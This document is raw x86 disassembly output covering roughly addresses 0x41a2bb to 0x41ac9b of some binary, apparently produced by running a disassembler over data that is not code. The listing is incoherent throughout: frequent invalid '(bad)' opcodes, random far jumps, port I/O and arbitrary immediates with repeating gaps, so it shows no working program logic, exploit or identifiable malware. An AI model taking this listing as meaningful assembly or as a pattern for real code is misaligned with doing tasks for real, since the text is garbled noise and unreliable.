  41a2bb:	jge    0x41a338
  41a2bd:	lods   eax,DWORD PTR ds:[esi]
  41a2be:	dec    ecx
  41a2bf:	rsqrtps xmm3,xmm6
  41a2c2:	ss loop 0x41a344
  41a2c5:	je     0x41a2ab
  41a2c7:	sbb    BYTE PTR [edx+eiz*4-0x356d2a8e],bl
  41a2ce:	sub    eax,0x783b03c5
  41a2d3:	out    dx,al
  41a2d4:	scas   al,BYTE PTR es:[edi]
  41a2d5:	pop    ds
  41a2d6:	jp     0x41a298
  41a2d8:	loop   0x41a27c
  41a2da:	sbb    BYTE PTR [edx+0xfcc5dc1],cl
  41a2e0:	pop    esp
  41a2e1:	inc    ebx
  41a2e2:	adc    eax,0x9d26c28e
  41a2e7:	pop    esi
  41a2e8:	retf   
  41a2e9:	(bad)  
  41a2ea:	cs inc edx
  41a2ec:	int3   
  41a2ed:	adc    DWORD PTR [ecx],0xffffffcc
  41a2f0:	shr    DWORD PTR [eax-0x6d],cl
  41a2f3:	dec    edx
  41a2f4:	mov    eax,0xfb6f7e17
  41a2f9:	test   al,0x7b
  41a2fb:	mov    ecx,0xac19da7c
  41a300:	pusha  
  41a301:	retf   
  41a302:	dec    ecx
  41a303:	out    0x3c,eax
  41a305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a306:	idiv   BYTE PTR [esi]
  41a308:	push   ebp
  41a309:	icebp  
  41a30a:	jle    0x41a2b3
  41a30c:	inc    ecx
  41a30d:	pop    edi
  41a30e:	dec    edx
  41a30f:	xor    al,0xdb
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x8ea6955c
  41a381:	loop   0x41a31b
  41a383:	js     0x41a3b0
  41a385:	push   ss
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0xf4000001
  41a38d:	sbb    BYTE PTR [ecx],ah
  41a38f:	pop    esp
  41a390:	jecxz  0x41a3f0
  41a392:	pop    esi
  41a393:	stc    
  41a394:	xchg   esi,eax
  41a395:	dec    esp
  41a396:	shl    DWORD PTR [eax+eax*4+0x35],cl
  41a39a:	sub    al,0x79
  41a39c:	iret   
  41a39d:	mov    es,WORD PTR [esi]
  41a39f:	mov    eax,ds:0x479769f5
  41a3a4:	push   ss
  41a3a5:	cmc    
  41a3a6:	sar    BYTE PTR [ebp-0x51e0fcb8],cl
  41a3ac:	xchg   edx,eax
  41a3ad:	sub    DWORD PTR [esi+0x6a],eax
  41a3b0:	bnd jb 0x41a3db
  41a3b3:	sar    eax,cl
  41a3b5:	mov    al,ds:0x69496a43
  41a3ba:	inc    eax
  41a3bb:	mov    al,ds:0xafc3aa2b
  41a3c0:	pusha  
  41a3c1:	lods   al,BYTE PTR ds:[esi]
  41a3c2:	xor    BYTE PTR [ebp-0xbd77ac4],0xa6
  41a3c9:	in     al,dx
  41a3ca:	add    eax,0x7215fe76
  41a3cf:	hlt    
  41a3d0:	(bad)  
  41a3d1:	sub    al,0x9
  41a3d3:	neg    DWORD PTR [edx+0x33]
  41a3d6:	mov    BYTE PTR [edx+eax*4-0x5a],bh
  41a3da:	xlat   BYTE PTR ds:[ebx]
  41a3db:	push   esp
  41a3dc:	test   BYTE PTR [ebp-0x5cb22e5a],ch
  41a3e2:	stos   BYTE PTR es:[edi],al
  41a3e3:	push   esp
  41a3e4:	add    BYTE PTR fs:[ebx+0x5ebb4d20],cl
  41a3eb:	jmp    0x951:0xadaeec2f
  41a3f2:	clc    
  41a3f3:	xor    eax,0x20664b88
  41a3f8:	sub    ch,dl
  41a3fa:	cmc    
  41a3fb:	and    BYTE PTR [esi-0x6],al
  41a3fe:	inc    edi
  41a3ff:	mov    dh,0xdc
  41a401:	imul   edx,DWORD PTR [ebx+0x1c],0x25583e7a
  41a408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a409:	jg     0x41a3d5
  41a40b:	ds push esp
  41a40d:	sbb    cl,0x57
  41a410:	sub    al,0x75
  41a412:	enter  0xdb27,0x62
  41a416:	pop    edi
  41a417:	xor    BYTE PTR [ebx+ebx*1+0x70432eb9],cl
  41a41e:	outs   dx,BYTE PTR ds:[esi]
  41a41f:	xchg   esi,eax
  41a420:	or     DWORD PTR [ecx],0xe859f984
  41a426:	out    0x10,al
  41a428:	xchg   ecx,eax
  41a429:	cld    
  41a42a:	push   0xe0d5da9
  41a42f:	and    DWORD PTR [eax+0x31fddd62],0x76
  41a436:	pop    ds
  41a437:	outs   dx,DWORD PTR ds:[esi]
  41a438:	ins    DWORD PTR es:[edi],dx
  41a439:	in     al,dx
  41a43a:	adc    DWORD PTR [edi+0x39],edi
  41a43d:	int3   
  41a43e:	mov    ebx,0x701994c4
  41a443:	dec    esp
  41a444:	push   ss
  41a445:	mov    ah,0x47
  41a447:	into   
  41a448:	icebp  
  41a449:	push   ebp
  41a44a:	sbb    al,0x61
  41a44c:	or     ebp,DWORD PTR [ebx-0x2c50fc0c]
  41a452:	and    al,bh
  41a454:	pusha  
  41a455:	stos   DWORD PTR es:[edi],eax
  41a456:	inc    eax
  41a457:	pop    eax
  41a458:	sahf   
  41a459:	loop   0x41a4cc
  41a45b:	pop    esp
  41a45c:	fcomp  DWORD PTR [ebx]
  41a45e:	(bad)  
  41a45f:	jmp    0x47c37ecb
  41a464:	mov    edx,0xe2108d9
  41a469:	pop    ecx
  41a46a:	retf   
  41a46b:	adc    edi,ecx
  41a46d:	outs   dx,DWORD PTR ds:[esi]
  41a46e:	jmp    0x1a54f92a
  41a473:	cmp    bh,al
  41a475:	arpl   si,cx
  41a477:	adc    dl,BYTE PTR [ecx+0x25]
  41a47a:	jp     0x41a42c
  41a47c:	and    DWORD PTR [ecx-0x486c29a6],ebp
  41a482:	or     BYTE PTR [edx+eax*1+0x4541ca36],bl
  41a489:	or     al,0xe9
  41a48b:	lods   eax,DWORD PTR ds:[esi]
  41a48c:	scas   eax,DWORD PTR es:[edi]
  41a48d:	fdivp  st(2),st
  41a48f:	loop   0x41a460
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	aam    0x5e
  41a502:	xor    DWORD PTR [eax+0x30],edi
  41a505:	pop    ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x18000001
  41a50d:	and    eax,0x50b13561
  41a512:	sbb    DWORD PTR [esi*8-0x5498b33c],edi
  41a519:	sub    ebx,DWORD PTR [ebx+eiz*2+0xa5b0f39]
  41a520:	fdivr  DWORD PTR [eax-0x7da1cc5f]
  41a526:	enter  0x1796,0xda
  41a52a:	mov    esp,0x7e78cc88
  41a52f:	out    dx,al
  41a530:	and    DWORD PTR [esi+0x68eb124d],0x62
  41a537:	xchg   BYTE PTR ds:0x183f7eec,ah
  41a53d:	xchg   ebp,eax
  41a53e:	push   edi
  41a53f:	mov    ebp,0x24377202
  41a544:	cdq    
  41a545:	xchg   ebx,eax
  41a546:	fcmovnb st,st(4)
  41a548:	fwait
  41a549:	xchg   esp,eax
  41a54a:	bnd jmp 0x41a5c9
  41a54d:	ja     0x41a566
  41a54f:	test   DWORD PTR [esi+ecx*8+0x10],ecx
  41a553:	fsubr  st(3),st
  41a555:	jno    0x41a56e
  41a557:	mov    ch,0x48
  41a559:	mov    ch,0x5b
  41a55b:	lods   eax,DWORD PTR ds:[esi]
  41a55c:	adc    DWORD PTR [eax+0x1ff066d9],esp
  41a562:	ja     0x41a58b
  41a564:	inc    ecx
  41a565:	xchg   esp,eax
  41a566:	sbb    eax,0xce2b5fd4
  41a56b:	(bad)  
  41a56c:	iret   
  41a56d:	mov    ebx,0x89bd75e2
  41a572:	adc    ch,BYTE PTR [esi]
  41a574:	mov    al,BYTE PTR [edi-0x4e457270]
  41a57a:	cmp    DWORD PTR [edi+0x63],ebx
  41a57d:	push   ecx
  41a57e:	out    dx,al
  41a57f:	pop    ss
  41a580:	icebp  
  41a581:	inc    edx
  41a582:	dec    edx
  41a583:	xor    ah,BYTE PTR [ecx-0x173ccf39]
  41a589:	fiadd  DWORD PTR [ebp+edx*1+0x866d5fc]
  41a590:	push   esi
  41a591:	aam    0xe0
  41a593:	cwde   
  41a594:	sbb    DWORD PTR ds:0x2a95b4b3,eax
  41a59a:	push   ebp
  41a59b:	mov    dl,0xbd
  41a59d:	mov    ebp,0xb2eec595
  41a5a2:	adc    BYTE PTR [edi-0x2a],0x7e
  41a5a6:	jnp    0x41a5bf
  41a5a8:	mov    esp,0xea3562f2
  41a5ad:	icebp  
  41a5ae:	call   FWORD PTR [eax]
  41a5b0:	daa    
  41a5b1:	pop    edi
  41a5b2:	mov    esp,DWORD PTR [ebx-0x9a3599f]
  41a5b8:	pop    ecx
  41a5b9:	stos   BYTE PTR es:[edi],al
  41a5ba:	mov    al,ds:0xe58e5fe8
  41a5bf:	mov    ds,WORD PTR [esi-0x107b0ae0]
  41a5c5:	mov    ebp,0xd01b487e
  41a5ca:	xor    ah,BYTE PTR [edi]
  41a5cc:	inc    eax
  41a5cd:	fstp   DWORD PTR [edi-0xe58f495]
  41a5d3:	xor    BYTE PTR [eax+eiz*1-0xc454ed4],ah
  41a5da:	sub    DWORD PTR [esi],ecx
  41a5dc:	add    cl,ah
  41a5de:	scas   al,BYTE PTR es:[edi]
  41a5df:	loop   0x41a573
  41a5e1:	mov    bl,0x7b
  41a5e3:	jnp    0x41a638
  41a5e5:	xor    esi,DWORD PTR [ebx+0x5c]
  41a5e8:	sti    
  41a5e9:	cli    
  41a5ea:	(bad)
  41a5ee:	(bad)  
  41a5ef:	cwde   
  41a5f0:	jecxz  0x41a5ca
  41a5f2:	push   ds
  41a5f3:	xor    al,BYTE PTR es:[esp]
  41a5f7:	jno    0x41a626
  41a5f9:	pop    ebx
  41a5fa:	(bad)  [esi+ebx*2-0x729aad65]
  41a601:	xchg   ebx,eax
  41a602:	xchg   edx,eax
  41a603:	push   cs
  41a604:	and    ah,BYTE PTR [ebx+0x60]
  41a607:	int    0x33
  41a609:	into   
  41a60a:	xchg   esi,eax
  41a60b:	jbe    0x41a622
  41a60d:	cmp    edi,DWORD PTR [esi]
  41a60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a610:	pop    ebp
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xa552a625
  41a682:	scas   eax,DWORD PTR es:[edi]
  41a683:	cmp    eax,0x11835
  41a688:	add    eax,0xc0000001
  41a68d:	xchg   al,bl
  41a68f:	push   ebp
  41a690:	ins    DWORD PTR es:[edi],dx
  41a691:	jge    0x41a639
  41a693:	add    edi,DWORD PTR [edi-0x7a]
  41a696:	xchg   cl,al
  41a698:	dec    edx
  41a699:	imul   eax,DWORD PTR [ecx+ecx*8-0x2cf637b5],0x7f086b8
  41a6a4:	popa   
  41a6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a6:	push   esi
  41a6a7:	outs   dx,BYTE PTR ds:[esi]
  41a6a8:	fcom   QWORD PTR [ebx-0x43]
  41a6ab:	ret    0x395c
  41a6ae:	in     eax,0xdf
  41a6b0:	cld    
  41a6b1:	mov    esi,0xe3bea401
  41a6b6:	dec    ebx
  41a6b7:	imul   ecx,DWORD PTR [ebp-0x1a],0xffffffb0
  41a6bb:	shr    BYTE PTR [ebp-0x1df7d23c],1
  41a6c1:	ins    DWORD PTR es:[edi],dx
  41a6c2:	xlat   BYTE PTR ds:[ebx]
  41a6c3:	shr    BYTE PTR [ebx-0x1e],1
  41a6c6:	aas    
  41a6c7:	and    eax,0xb14337f2
  41a6cc:	mov    ch,0x43
  41a6ce:	or     DWORD PTR [ecx+0x19678b3],eax
  41a6d4:	mov    ebp,0xcddb67d9
  41a6d9:	and    eax,0xd7dd1c4f
  41a6de:	aad    0x87
  41a6e0:	mov    dl,0x69
  41a6e2:	inc    ecx
  41a6e3:	sbb    eax,0xc63a7f1b
  41a6e8:	add    al,0x75
  41a6ea:	lds    edi,FWORD PTR ds:0x3904927e
  41a6f0:	mov    dh,0x82
  41a6f2:	inc    eax
  41a6f3:	test   BYTE PTR [eax],0x66
  41a6f6:	in     ax,dx
  41a6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6f9:	mov    ah,0x91
  41a6fb:	loop   0x41a74c
  41a6fd:	sahf   
  41a6fe:	out    0x27,eax
  41a700:	(bad)  
  41a702:	out    0x3e,eax
  41a704:	ret    0xb7c9
  41a707:	xchg   ecx,eax
  41a708:	sub    ebp,DWORD PTR [edi+eiz*4-0x2b22cc39]
  41a70f:	jne    0x41a698
  41a711:	xchg   edx,eax
  41a712:	jne    0x41a75f
  41a714:	loop   0x41a78b
  41a716:	cwde   
  41a717:	mov    ebx,0x95439699
  41a71c:	mov    DWORD PTR [edx-0x200cfcb],edx
  41a722:	mov    eax,ds:0xc43bfcfe
  41a727:	fmul   DWORD PTR ds:[edi+0x7589825f]
  41a72e:	in     eax,dx
  41a72f:	lods   al,BYTE PTR ds:[esi]
  41a730:	enter  0x74ca,0x96
  41a734:	push   ds
  41a735:	leave  
  41a736:	sub    DWORD PTR [eax+esi*4],0x7f0d2868
  41a73d:	popa   
  41a73e:	lods   al,BYTE PTR ds:[esi]
  41a73f:	xlat   BYTE PTR ds:[ebx]
  41a740:	lds    eax,FWORD PTR [esi+0x44]
  41a743:	bound  ebp,QWORD PTR ds:0x558a565d
  41a749:	and    ebx,esi
  41a74b:	lock test WORD PTR [ebx],ax
  41a74f:	fld    TBYTE PTR [ebx-0x26b415f6]
  41a755:	ja     0x41a77d
  41a757:	nop
  41a758:	or     bh,BYTE PTR [ecx]
  41a75a:	dec    ecx
  41a75b:	es out 0xda,al
  41a75e:	adc    BYTE PTR [ecx+esi*1+0x56],cl
  41a762:	mov    edx,0xa5f28c
  41a767:	inc    edx
  41a768:	xor    ebx,DWORD PTR [edx]
  41a76a:	jae    0x41a75a
  41a76c:	pop    ecx
  41a76d:	cdq    
  41a76e:	and    cl,bh
  41a770:	out    0x15,al
  41a772:	push   edx
  41a773:	xor    ah,BYTE PTR [esi+0x29]
  41a776:	mov    ds:0x45fbadf2,eax
  41a77b:	push   esi
  41a77c:	jo     0x41a6ff
  41a77e:	mov    ah,0xcb
  41a780:	jle    0x41a7d7
  41a782:	mov    cl,0xbb
  41a784:	push   esp
  41a785:	(bad)  
  41a786:	mov    gs:0x3ae27a1d,al
  41a78c:	popa   
  41a78d:	add    BYTE PTR [eax+esi*8],al
  41a790:	dec    ebx
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x385327ca,al
  41a801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a802:	sahf   
  41a803:	pop    esp
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0xca000001
  41a80d:	inc    edi
  41a80e:	stc    
  41a80f:	fs pop ebx
  41a811:	aad    0x8a
  41a813:	sbb    ecx,ecx
  41a815:	dec    edi
  41a816:	cmp    DWORD PTR [eax-0x4d],ebp
  41a819:	lods   al,BYTE PTR ds:[esi]
  41a81a:	lods   eax,DWORD PTR ds:[esi]
  41a81b:	sbb    edi,DWORD PTR [eax+ebp*4+0x1bacf832]
  41a822:	push   edi
  41a823:	mov    cl,0x47
  41a825:	fild   WORD PTR ds:0xdb3563e2
  41a82b:	pop    eax
  41a82c:	sahf   
  41a82d:	(bad)  
  41a82e:	push   0xffffffaa
  41a830:	imul   edx,esp,0x5
  41a833:	inc    eax
  41a834:	enter  0xee64,0xd9
  41a838:	imul   ebx,edi,0x77
  41a83b:	or     al,0x2f
  41a83d:	bound  edi,QWORD PTR [ecx-0x43]
  41a840:	(bad)  
  41a841:	in     al,dx
  41a842:	(bad)  
  41a843:	loop   0x41a890
  41a845:	imul   ebx,DWORD PTR [edx-0x5ea04df7],0xc5b793f3
  41a84f:	test   al,0x85
  41a851:	test   eax,0x413c9a43
  41a856:	es sbb cl,bh
  41a859:	in     eax,dx
  41a85a:	inc    edx
  41a85b:	cld    
  41a85c:	xchg   esp,eax
  41a85d:	aaa    
  41a85e:	jbe    0x41a80b
  41a860:	adc    al,0xa5
  41a862:	xor    eax,0xc9ecd531
  41a867:	mov    edx,0x7d9d5c48
  41a86c:	test   edx,ebx
  41a86e:	out    dx,eax
  41a86f:	and    eax,0xc89ef408
  41a874:	popa   
  41a875:	sub    edx,eax
  41a877:	repnz das 
  41a879:	imul   edi
  41a87b:	into   
  41a87c:	mov    ss,WORD PTR [edx-0x5997bc2a]
  41a882:	and    edx,DWORD PTR ds:0x2f552e09
  41a888:	push   es
  41a889:	outs   dx,BYTE PTR ds:[esi]
  41a88a:	test   DWORD PTR ds:0x98ee3ce6,edi
  41a890:	cli    
  41a891:	xlat   BYTE PTR ds:[ebx]
  41a892:	jmp    0x66648be4
  41a897:	clc    
  41a898:	mov    cl,0xef
  41a89a:	cmp    al,0xdd
  41a89c:	xchg   ebx,eax
  41a89d:	inc    ebp
  41a89e:	lods   al,BYTE PTR ds:[esi]
  41a89f:	test   al,0xd9
  41a8a1:	loope  0x41a84f
  41a8a3:	ror    DWORD PTR [edx-0x4d],cl
  41a8a6:	test   al,0xff
  41a8a8:	sti    
  41a8a9:	push   es
  41a8aa:	xor    bl,BYTE PTR ds:0x59fb79da
  41a8b0:	imul   ebp,ebx,0xffffffdb
  41a8b3:	inc    edi
  41a8b4:	aaa    
  41a8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b6:	fst    QWORD PTR [edx+0x20f2830f]
  41a8bc:	jge    0x41a8ae
  41a8be:	mov    bl,BYTE PTR [edx]
  41a8c0:	cli    
  41a8c1:	mov    ch,0xaa
  41a8c3:	stos   DWORD PTR es:[edi],eax
  41a8c4:	sahf   
  41a8c5:	int3   
  41a8c6:	call   0x83cdde48
  41a8cb:	js     0x41a92f
  41a8cd:	(bad)  
  41a8ce:	repz jae 0x41a920
  41a8d1:	push   edx
  41a8d2:	pop    ebp
  41a8d3:	pop    ebx
  41a8d4:	int    0x8d
  41a8d6:	add    edx,ecx
  41a8d8:	in     al,0x5b
  41a8da:	jle    0x41a931
  41a8dc:	dec    edx
  41a8dd:	fdiv   st,st(3)
  41a8df:	sub    BYTE PTR [edx+0x61201f9b],bh
  41a8e5:	inc    ecx
  41a8e6:	cld    
  41a8e7:	push   ebx
  41a8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e9:	aas    
  41a8ea:	dec    ecx
  41a8eb:	mul    BYTE PTR [ebx+0x1b]
  41a8ee:	adc    edx,DWORD PTR [ecx+0x74]
  41a8f1:	or     ch,BYTE PTR [eax-0x21]
  41a8f4:	in     eax,0x25
  41a8f6:	push   cs
  41a8f7:	sti    
  41a8f8:	rcr    BYTE PTR [esi+0x3aee3eeb],cl
  41a8fe:	rcl    cl,1
  41a900:	inc    ecx
  41a901:	lahf   
  41a902:	jne    0x41a93e
  41a904:	push   ebp
  41a905:	je     0x41a8f0
  41a907:	mov    esp,ebp
  41a909:	mov    dl,0x73
  41a90b:	pushf  
  41a90c:	cmp    eax,0x9fd73b39
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	jecxz  0x41a943
  41a982:	cmp    BYTE PTR [edi+0x3f],0x1a
  41a986:	add    DWORD PTR [eax],eax
  41a988:	add    eax,0xc000001
  41a98d:	pop    eax
  41a98e:	sbb    ah,BYTE PTR [edi-0x7]
  41a991:	dec    esp
  41a992:	sub    dh,BYTE PTR [eax+0x3872b99]
  41a998:	sub    al,0x54
  41a99a:	sbb    bh,dl
  41a99c:	jmp    0xc8a1:0xafa60f80
  41a9a3:	cmp    dl,0xd
  41a9a6:	sub    BYTE PTR [edx-0x3],0xe4
  41a9aa:	das    
  41a9ab:	mov    bh,0x2b
  41a9ad:	and    edx,ecx
  41a9af:	mov    eax,?
  41a9b1:	mov    bh,BYTE PTR [ecx+0x765c18bb]
  41a9b7:	mov    edx,0xfd4ea108
  41a9bc:	mov    ah,0xb6
  41a9be:	push   ebp
  41a9bf:	pop    ebx
  41a9c0:	jp     0x41aa32
  41a9c2:	push   ebx
  41a9c3:	and    al,0xb1
  41a9c5:	rol    BYTE PTR [ebx],cl
  41a9c7:	adc    al,0x20
  41a9c9:	mov    eax,ds:0x84b0f02c
  41a9ce:	outs   dx,BYTE PTR ds:[esi]
  41a9cf:	test   DWORD PTR [esp+ebp*4+0x13],edx
  41a9d3:	push   ss
  41a9d4:	aad    0x91
  41a9d6:	ins    DWORD PTR es:[edi],dx
  41a9d7:	aam    0x9e
  41a9d9:	nop
  41a9da:	xor    edi,DWORD PTR [eax+0x1f]
  41a9dd:	cwde   
  41a9de:	ror    DWORD PTR [ecx],1
  41a9e0:	icebp  
  41a9e1:	jp     0x41a9a5
  41a9e3:	and    BYTE PTR [eax+edi*2-0x4d],bh
  41a9e7:	add    al,BYTE PTR [eax+0x69072558]
  41a9ed:	scas   al,BYTE PTR es:[edi]
  41a9ee:	scas   eax,DWORD PTR es:[edi]
  41a9ef:	loop   0x41a9dc
  41a9f1:	mov    al,ds:0x920df5b6
  41a9f6:	mov    esi,0x7195f415
  41a9fb:	pop    ecx
  41a9fc:	in     al,0xe8
  41a9fe:	test   al,0xaa
  41aa00:	jl     0x41a9b4
  41aa02:	push   0x63ae9e84
  41aa07:	retf   
  41aa08:	inc    edi
  41aa09:	out    dx,eax
  41aa0a:	push   DWORD PTR [edi+0x21]
  41aa0d:	mov    dl,0x41
  41aa0f:	mov    ds:0xead2c8a,al
  41aa14:	jmp    0x5d1f:0x2fced109
  41aa1b:	sti    
  41aa1c:	dec    esp
  41aa1d:	fmul   QWORD PTR [eax]
  41aa1f:	fcomp  DWORD PTR [edi-0x64]
  41aa22:	jnp    0x41a9e1
  41aa24:	imul   BYTE PTR [ebp+0x6b790548]
  41aa2a:	adc    dh,bl
  41aa2c:	pop    ebp
  41aa2d:	inc    edi
  41aa2e:	adc    DWORD PTR [eax+0x0],ebp
  41aa31:	ins    DWORD PTR es:[edi],dx
  41aa32:	sti    
  41aa33:	ret    
  41aa34:	jge    0x41aa99
  41aa36:	js     0x41aa37
  41aa38:	mov    edx,0x2246eb07
  41aa3d:	pop    ss
  41aa3e:	aaa    
  41aa3f:	and    dh,BYTE PTR [ecx]
  41aa41:	xor    DWORD PTR [edi+0x29],0x6a77cd4b
  41aa48:	repnz (bad) 
  41aa4a:	xor    cl,BYTE PTR [ecx+ecx*8+0x37]
  41aa4e:	test   al,0x14
  41aa50:	or     dh,al
  41aa52:	jg     0x41a9dc
  41aa54:	ret    
  41aa55:	ret    0xb275
  41aa58:	inc    eax
  41aa59:	scas   eax,DWORD PTR es:[edi]
  41aa5a:	fist   WORD PTR [edx+0x1a5dfd8d]
  41aa60:	inc    ebx
  41aa61:	and    esi,edx
  41aa63:	inc    esp
  41aa64:	mov    bl,0x2d
  41aa66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa67:	mov    BYTE PTR [ebx],bl
  41aa69:	test   DWORD PTR [eax+0x41ea32e7],ebp
  41aa6f:	cmp    al,0x67
  41aa71:	repnz jecxz 0x41aa58
  41aa74:	xchg   ebx,eax
  41aa75:	pop    edi
  41aa76:	mov    edx,0x8fe31ac5
  41aa7b:	xchg   edi,eax
  41aa7c:	dec    eax
  41aa7d:	mov    bh,0x36
  41aa7f:	dec    ebp
  41aa80:	pop    esp
  41aa81:	imul   ecx,edx,0xea23501d
  41aa87:	(bad)  
  41aa88:	mov    ch,0x3
  41aa8a:	adc    al,0xa7
  41aa8c:	or     DWORD PTR [eax+edx*1-0x5],esp
  41aa90:	adc    al,BYTE PTR [eax]
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	dec    ecx
  41ab01:	stc    
  41ab02:	int    0x3d
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x53000001,al
  41ab0d:	stc    
  41ab0e:	jns    0x41ab7a
  41ab10:	mov    al,ds:0xf97ac4fd
  41ab15:	in     al,0xbf
  41ab17:	cmp    eax,0xfe756207
  41ab1c:	fdivr  QWORD PTR [ecx]
  41ab1e:	xor    eax,0xcde8ae84
  41ab23:	fisttp WORD PTR [eax+0x33]
  41ab26:	jno    0x41ab5c
  41ab28:	pusha  
  41ab29:	and    al,0x2b
  41ab2b:	jbe    0x41ab77
  41ab2d:	pop    ecx
  41ab2e:	push   ebp
  41ab2f:	adc    DWORD PTR ds:0xb923b8f4,0xffffffd1
  41ab36:	(bad)  
  41ab37:	clc    
  41ab38:	dec    ebx
  41ab39:	shr    BYTE PTR [eax-0xc],0xec
  41ab3d:	call   0xd304:0x35b3df3b
  41ab44:	call   0x41b631e9
  41ab49:	add    DWORD PTR [esp+edx*1+0x600b7d73],edi
  41ab50:	mov    ch,0x31
  41ab52:	test   al,0xf
  41ab54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab55:	fld    st(4)
  41ab57:	(bad)  
  41ab58:	mov    eax,ds:0xc15d5a4f
  41ab5d:	add    DWORD PTR [ebp+eax*8+0x30],0x0
  41ab62:	xchg   ebp,eax
  41ab63:	jge    0x41ab21
  41ab65:	loope  0x41ab0e
  41ab67:	sub    eax,0x9a480597
  41ab6c:	dec    esi
  41ab6d:	pop    ebp
  41ab6e:	jno    0x41abb2
  41ab70:	mov    edx,0xc315d206
  41ab75:	in     al,dx
  41ab76:	push   0xcc73ce8b
  41ab7b:	inc    ebp
  41ab7c:	fwait
  41ab7d:	ins    DWORD PTR es:[edi],dx
  41ab7e:	aam    0x19
  41ab80:	scas   eax,DWORD PTR es:[edi]
  41ab81:	mov    dh,0x80
  41ab83:	daa    
  41ab84:	push   0xd47e1164
  41ab89:	inc    eax
  41ab8a:	xor    eax,0x25768019
  41ab8f:	ud0    eax,DWORD PTR [ebx+0x54]
  41ab93:	or     DWORD PTR ds:0xe4ac1d1b,esi
  41ab99:	scas   al,BYTE PTR es:[edi]
  41ab9a:	in     eax,dx
  41ab9b:	xor    DWORD PTR ds:0x3254d87d,0xb970e909
  41aba5:	(bad)  
  41aba6:	adc    al,BYTE PTR [ebx-0x7589ec7c]
  41abac:	leave  
  41abad:	dec    ebx
  41abae:	int    0x58
  41abb0:	mov    BYTE PTR [edi],cl
  41abb2:	loopne 0x41abcf
  41abb4:	or     ebx,DWORD PTR [edx+0x323be16f]
  41abba:	shl    DWORD PTR [esi+0x2e],cl
  41abbd:	inc    eax
  41abbe:	pop    eax
  41abbf:	imul   edx,DWORD PTR [ecx-0x34],0xb8d7ae4a
  41abc6:	adc    al,0xa0
  41abc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abca:	add    DWORD PTR [ecx],ebx
  41abcc:	jp     0x41ab60
  41abce:	fsubr  DWORD PTR [ebx]
  41abd0:	ror    DWORD PTR ds:0x7ee3daba,0xa9
  41abd7:	push   cs
  41abd8:	(bad)
  41abdb:	and    cl,ch
  41abdd:	mov    es,WORD PTR [edx]
  41abdf:	mov    edx,0xbc07b192
  41abe4:	xchg   esi,eax
  41abe5:	push   ds
  41abe6:	add    edi,DWORD PTR [esi-0x5fb157d3]
  41abec:	(bad)  
  41abed:	(bad)  
  41abee:	test   eax,0x71b00725
  41abf3:	jae    0x41abda
  41abf5:	xor    DWORD PTR [edx+0xb],edi
  41abf8:	bound  ebx,QWORD PTR [ecx]
  41abfa:	dec    ebx
  41abfb:	sar    DWORD PTR [esi-0x6f],cl
  41abfe:	imul   edi,ebx,0xffffffc0
  41ac01:	pop    ebx
  41ac02:	ss data16 sahf 
  41ac05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac06:	and    ch,BYTE PTR [ebx]
  41ac08:	xlat   BYTE PTR ds:[ebx]
  41ac09:	stos   DWORD PTR es:[edi],eax
  41ac0a:	int3   
  41ac0b:	scas   eax,DWORD PTR es:[edi]
  41ac0c:	(bad)  
  41ac0d:	out    dx,al
  41ac0e:	bound  ebx,QWORD PTR [eax+0x4f]
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+eiz*1+0x52]
  41ac82:	imul   esp,ecx,0x11c49
  41ac88:	add    eax,0x36000001
  41ac8d:	std    
  41ac8e:	lods   al,BYTE PTR ds:[esi]
  41ac8f:	xchg   ebp,eax
  41ac90:	fstp   QWORD PTR [eax+0x5d]
  41ac93:	push   ebx
  41ac94:	repnz sbb esi,DWORD PTR [eax+eiz*8]
  41ac98:	gs loope 0x41ad19
  41ac9b:	loop   0x41ac97
